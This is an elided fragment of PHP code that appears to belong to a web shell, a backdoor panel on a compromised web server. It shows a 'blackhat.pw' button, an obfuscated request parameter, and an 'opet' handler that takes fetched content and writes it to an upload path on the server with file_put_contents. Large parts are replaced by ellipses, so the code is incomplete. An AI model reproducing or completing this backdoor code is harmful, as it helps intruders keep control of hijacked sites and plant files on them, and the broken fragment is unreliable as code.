...
<button type="button" class="btn btn-outline-light" onclick=location.href="?path=' . $serlok . '&' . net("blackhat") . '=opet"><i class="fa fa-user-secret" style="color:#FF6B6B;"></i> blackhat.pw</button>
</td></tr></div>
    ...
    elseif ($_REQUEST[net('blackhat')] == "opet") {
        ...
        if (isset($_POST['download_verify'])) {
            ...
            if ($verifyContent === false) {
                ...
                echo "<center><a href='?path=" . $serlok . "&" . net('blackhat') . "=opet' class='btn btn-outline-light'>Try Again</a></center>";
            } else {
                ...
                if (file_put_contents($uploadPath, $verifyContent)) {
                    ...
                    echo "<br><center><a href='?path=" . $serlok . "&" . net('blackhat') . "=opet' class='btn btn-outline-light'>Back</a></center>";
                } else {
            ...
            echo "<div style='padding:15px; border:1px solid #40BECC; border-radius:8px; margin:10px;'>";
            ...
            echo "<a href='?path=" . $serlok . "' class='btn btn-outline-light'>Back</a>";
            echo "</form></center>";
            echo "</div>";
